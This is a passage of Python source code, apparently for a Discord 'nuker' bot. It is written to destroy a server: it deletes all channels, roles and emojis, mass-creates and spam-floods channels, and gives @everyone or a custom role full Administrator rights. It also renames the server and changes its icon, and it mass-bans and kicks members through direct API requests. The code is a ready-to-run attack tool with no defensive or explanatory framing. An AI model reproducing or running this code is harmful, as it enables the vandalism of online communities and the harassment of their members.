    except Exception as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]An error occurred while creating roles: {e}")

    # Count successfully created roles
    success_count = sum(1 for role in created_roles if isinstance(role, discord.Role))
    print(f"            [{Fore.GREEN}+{Fore.RESET}] Roles created: {success_count}/{num_roles}")
    
    for role in created_roles:
        if isinstance(role, discord.Role):
            print(f"- {role.name} (Color: #{role.color.value:06X})")
        elif isinstance(role, Exception):
            print(f"            [{Fore.RED}-{Fore.RESET}]Failed to create a role: {role}")



async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            channel_futures = [delete_channel(channel) for channel in guild.channels]

            #role_futures = [delete_role(role) for role in guild.roles]

            channel_results = await asyncio.gather(*channel_futures)
            #role_results = await asyncio.gather(*role_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)


            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully deleted.")
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")


from config import FULL_NUKE

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  

            num_channels = FULL_NUKE['channel_number']
            channel_type = FULL_NUKE['channel_type']
            channel_name = FULL_NUKE['channel_name']

            channel_futures = [delete_channel(channel) for channel in guild.channels]

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            channel_results = await asyncio.gather(*channel_futures)
            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted.\n{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created.")

        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel couldnt be deleted {e}")

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel Created {new_channel.id}.")
        return new_channel
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't create {channel_type} channel: {e}")
        return None


async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.name} deleted.")
        return True
    except discord.NotFound:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel {channel.name} not found or already deleted.")
        return False
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Permission denied to delete channel {channel.name}.")
        return False
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error deleting channel {channel.name}: {e}")
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Role {role.name} deleted.")
        return True
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't delete role {role.name}: {e}")
        return False

async def delete_emojis(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server not found.")
        return

    try:
        for emoji in guild.emojis:
            await emoji.delete()
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Emoji {emoji.name} deleted.")
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}All emojis deleted successfully.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to delete emojis. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to delete emojis due to HTTPException: {e}")



async def rename_guild(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server not found.")
        return

    try:
        new_name = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
        await guild.edit(name=new_name)
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild renamed to {new_name}")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to rename guild. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}ailed to rename guild due to HTTPException: {e}")


async def change_guild_avatar(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server not found.")
        return

    try:
 
        avatar_path = 'avatar/avatar.png'
        if os.path.exists(avatar_path):
            with open(avatar_path, 'rb') as avatar_file:
                avatar_data = avatar_file.read()
                await guild.edit(icon=avatar_data)
                print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild avatar updated")
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Avatar file not found.")
    
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to update avatar. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to update avatar due to HTTPException: {e}")

async def change_server(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            server_config = config.SERVER

            new_name = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}") or server_config['new_name']
            new_icon = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} URL {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}") or None
            new_description = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} DESCRIPTION {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}") or server_config['new_description']

            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server name changed")

            # Handle server icon
            if new_icon:
                # Fetch the image from the provided URL
                try:
                    with urllib.request.urlopen(new_icon) as response:
                        icon_data = response.read()
                    await guild.edit(icon=icon_data)
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Icon changed using URL")
                except Exception as e:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to fetch icon from URL: {e}")
            else:
                # Use avatar/avatar.png as the default icon
                try:
                    with open("avatar/avatar.png", "rb") as f:
                        icon_data = f.read()
                    await guild.edit(icon=icon_data)
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Icon changed using 'avatar/avatar.png'")
                except Exception as e:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to use 'avatar/avatar.png': {e}")

            # Update server description
            await guild.edit(description=new_description)
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Description changed")

            end_time_guild_changer = time.time()
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully Changed Server.")
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")


async def riyu_ban_member(session, user_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}/bans/{user_id}'
    headers = {'Authorization': f'Bot {bot_token}'}
    try:
        async with session.put(url, headers=headers, json={'delete_message_days': 7}) as response:
            if response.status == 429:
                print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
            elif response.status == 204:
                print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Banned User {user_id}")
            else:
                print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't ban User {user_id}, status: {response.status}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error banning User {user_id}: {e}")

async def give_admin_to_everyone(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server not found.")
        return

    everyone_role = guild.default_role  

    try:
  
        await everyone_role.edit(permissions=discord.Permissions(administrator=True))
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}@everyone now has Administrator permissions.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to change @everyone permissions. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to modify permissions due to HTTPException: {e}")



async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} USERID {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Gand Phad Nuker™", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Admin role granted to {member.name}.")
                    except Exception as e:
                        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't grant admin role to {member.name}: {e}")

                end_time_total = time.time() 
                print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Admin role granted to the entire server.")

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Admin role granted to {target_user.name}.")
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Admin role granted to the entire server.")
                    else:
                        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}User with ID {user_id_or_all} not found.")

                except ValueError:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid user ID.")

        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")



async def get_invite_links(server_id):
    try:
        
        guild = bot.get_guild(int(server_id))
        if guild is None:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
            return
        

        invite = await create_permanent_invite(guild)


        bot_invite_link = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8"
        
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Invite Link: {invite}")
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Bot Invite Link: {bot_invite_link}")
        
    except discord.LoginFailure:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid bot token.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}The bot lacks permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error: {e}")


async def create_permanent_invite(guild):
    try:

        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
        return invite.url
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}The bot lacks permission to create invites in the server.")
        return None
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error creating invite: {e}")
        return None








async def fetch_members(session):
    url = f'https://discord.com/api/v9/guilds/{server_id}/members?limit=1000'
    headers = {'Authorization': f'Bot {bot_token}'}  # Ensure bot_token is defined
    members = []
    while url:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                members.extend(data)
                # Pagination handling if there are more than 1000 members
                if 'next' in response.headers:
                    url = response.headers['next']
                else:
                    break
            else:
                print(f"Failed to fetch members, status code: {response.status}")
                return []
    return members


async def riyu_kick_member(session, user_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}/members/{user_id}'
    headers = {'Authorization': f'Bot {bot_token}'}
    try:
        async with session.delete(url, headers=headers) as response:
            if response.status == 429:
                print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
            else:
                if response.status == 204:
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Kicked User {user_id}")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't kick User {user_id}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error kicking User {user_id}: {e}")

async def change_nickname(session, new_nickname, user_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}/members/{user_id}'
    headers = {'Authorization': f'Bot {bot_token}'}
    data = {
        'nick': new_nickname
    }
    try:
        async with session.patch(url, headers=headers, json=data) as response:
            if response.status == 429:
                print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
            else:
                if response.status == 200:
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Changed nickname for User {user_id}.")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't change nickname for User {user_id}.")
    except Exception as e:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error changing nickname for User {user_id}: {e}")



def log_message(message):
    print((message))




async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Message {i+1}/{num_messages} sent to channel {channel.name}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Can't send messages to channel {channel.name}: {e}")
        return False

    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = FULL_NUKE['num_messages']
            message_content = FULL_NUKE['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)  
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Spam - {num_messages} messages sent to all text channels.")
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Message coulnt be send to channel {e}")

bot.run(bot_token)

